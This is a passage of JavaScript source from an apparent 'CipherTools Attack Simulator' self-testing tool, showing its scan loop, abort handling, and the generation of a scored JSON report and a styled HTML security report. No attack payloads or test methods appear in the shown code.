            const testName = tests[i];
            this._emit('[' + (i + 1) + '/' + tests.length + '] Running ' + testName + '...', 'info');

            try {
                const testResults = await this[testName]();
                this.results.push.apply(this.results, testResults);
            } catch (err) {
                this.results.push(this._result(
                    testName,
                    'warn',
                    'Test encountered an error: ' + (err.message || String(err))
                ));
                this._emit('  ERROR: ' + (err.message || String(err)), 'error');
            }

            this._emit('', 'info');
            await this._sleep(100);
        }

        const endTime = new Date();
        const duration = ((endTime - this.startTime) / 1000).toFixed(1);

        this._emit('=== Scan Complete in ' + duration + 's ===', 'header');
        this._emit('Results: ' + this.results.length + ' checks performed.', 'info');

        this.isRunning = false;

        const report = this.generateReport();

        if (typeof this.onComplete === 'function') {
            this.onComplete(report);
        }

        return report;
    }

    abort() {
        this.aborted = true;
        this._emit('Aborting scan...', 'error');
    }

    // ----------------------------------------------------------------
    // Report Generation
    // ----------------------------------------------------------------

    generateReport() {
        const passed = this.results.filter(function(r) { return r.status === 'pass'; });
        const failed = this.results.filter(function(r) { return r.status === 'fail'; });
        const warnings = this.results.filter(function(r) { return r.status === 'warn'; });

        const total = this.results.length;
        const score = total > 0 ? Math.round((passed.length / total) * 100) : 0;

        return {
            target: this.origin,
            timestamp: this._timestamp(),
            startTime: this.startTime ? this.startTime.toISOString() : null,
            duration: this.startTime ? ((new Date() - this.startTime) / 1000).toFixed(1) + 's' : 'N/A',
            score: score,
            total: total,
            passed: passed,
            failed: failed,
            warnings: warnings,
            results: this.results
        };
    }

    generateHTMLReport() {
        const report = this.generateReport();

        var scoreColor;
        if (report.score >= 80) {
            scoreColor = '#22c55e';
        } else if (report.score >= 50) {
            scoreColor = '#fb923c';
        } else {
            scoreColor = '#ef4444';
        }

        var html = '<!DOCTYPE html>\n';
        html += '<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
        html += '<title>CipherTools Security Report - ' + new Date().toLocaleDateString() + '</title>\n';
        html += '<style>\n';
        html += '  * { margin: 0; padding: 0; box-sizing: border-box; }\n';
        html += '  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0a0a0f; color: #e4e4e7; padding: 40px; }\n';
        html += '  .report-header { text-align: center; margin-bottom: 40px; border-bottom: 2px solid #7c3aed; padding-bottom: 30px; }\n';
        html += '  .report-header h1 { color: #7c3aed; font-size: 2rem; margin-bottom: 10px; }\n';
        html += '  .score-ring { width: 150px; height: 150px; border-radius: 50%; border: 8px solid ' + scoreColor + '; display: flex; align-items: center; justify-content: center; margin: 20px auto; }\n';
        html += '  .score-ring span { font-size: 2.5rem; font-weight: 900; color: ' + scoreColor + '; }\n';
        html += '  .summary { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 40px; }\n';
        html += '  .summary-card { background: rgba(24,24,30,0.7); border: 1px solid #27272a; padding: 20px; border-radius: 8px; text-align: center; }\n';
        html += '  .summary-card.pass { border-left: 4px solid #22c55e; }\n';
        html += '  .summary-card.fail { border-left: 4px solid #ef4444; }\n';
        html += '  .summary-card.warn { border-left: 4px solid #fb923c; }\n';
        html += '  .summary-card .count { font-size: 2rem; font-weight: 700; }\n';
        html += '  .results-section { margin-bottom: 30px; }\n';
        html += '  .results-section h2 { color: #7c3aed; margin-bottom: 15px; font-size: 1.3rem; }\n';
        html += '  .result-item { background: rgba(24,24,30,0.6); border: 1px solid #27272a; padding: 15px 20px; border-radius: 8px; margin-bottom: 8px; }\n';
        html += '  .result-item.pass { border-left: 4px solid #22c55e; }\n';
        html += '  .result-item.fail { border-left: 4px solid #ef4444; }\n';
        html += '  .result-item.warn { border-left: 4px solid #fb923c; }\n';
        html += '  .result-name { font-weight: 600; margin-bottom: 5px; }\n';
        html += '  .result-detail { color: #71717a; font-size: 0.9rem; }\n';
        html += '  .result-badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; }\n';
        html += '  .badge-pass { background: rgba(34,197,94,0.2); color: #22c55e; }\n';
        html += '  .badge-fail { background: rgba(239,68,68,0.2); color: #ef4444; }\n';
        html += '  .badge-warn { background: rgba(251,146,60,0.2); color: #fb923c; }\n';
        html += '  .footer { text-align: center; margin-top: 40px; color: #71717a; font-size: 0.85rem; border-top: 1px solid #27272a; padding-top: 20px; }\n';
        html += '  .disclaimer { background: rgba(124,58,237,0.1); border: 1px solid #7c3aed; padding: 15px; border-radius: 8px; margin-bottom: 30px; text-align: center; font-size: 0.85rem; color: #a78bfa; }\n';
        html += '  @media print { body { background: white; color: black; } .result-item { border: 1px solid #ccc; } }\n';
        html += '</style></head><body>\n';

        html += '<div class="disclaimer">AUTHORIZED SECURITY TEST - This report was generated by CipherTools Attack Simulator for authorized self-testing only.</div>\n';
        html += '<div class="report-header">\n';
        html += '  <h1>CipherTools Security Report</h1>\n';
        html += '  <p>Target: ' + report.target + '</p>\n';
        html += '  <p>Date: ' + new Date().toLocaleString() + ' | Duration: ' + report.duration + '</p>\n';
        html += '  <div class="score-ring"><span>' + report.score + '%</span></div>\n';
        html += '  <p>Overall Security Score</p>\n';
        html += '</div>\n';

        html += '<div class="summary">\n';
        html += '  <div class="summary-card pass"><div class="count">' + report.passed.length + '</div><div>Passed</div></div>\n';
        html += '  <div class="summary-card fail"><div class="count">' + report.failed.length + '</div><div>Failed</div></div>\n';
        html += '  <div class="summary-card warn"><div class="count">' + report.warnings.length + '</div><div>Warnings</div></div>\n';
        html += '</div>\n';

        var sections = [
            { title: 'Failed Checks', items: report.failed, cls: 'fail' },
            { title: 'Warnings', items: report.warnings, cls: 'warn' },
            { title: 'Passed Checks', items: report.passed, cls: 'pass' }
        ];

        for (var s = 0; s < sections.length; s++) {
            var section = sections[s];
            if (section.items.length === 0) continue;
            html += '<div class="results-section">\n';
            html += '  <h2>' + section.title + ' (' + section.items.length + ')</h2>\n';
            for (var j = 0; j < section.items.length; j++) {
                var r = section.items[j];
                html += '  <div class="result-item ' + section.cls + '">\n';
                html += '    <div class="result-name"><span class="result-badge badge-' + section.cls + '">' + r.status.toUpperCase() + '</span> ' + r.name + '</div>\n';
                html += '    <div class="result-detail">' + r.details + '</div>\n';
                html += '  </div>\n';
            }
            html += '</div>\n';
        }

        html += '<div class="footer">\n';
        html += '  <p>Generated by CipherTools Attack Simulator</p>\n';
        html += '  <p>This is an authorized self-assessment report. Do not distribute without authorization.</p>\n';
        html += '</div>\n';
        html += '</body></html>';

        return html;
    }
}

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { AttackSimulator };
}
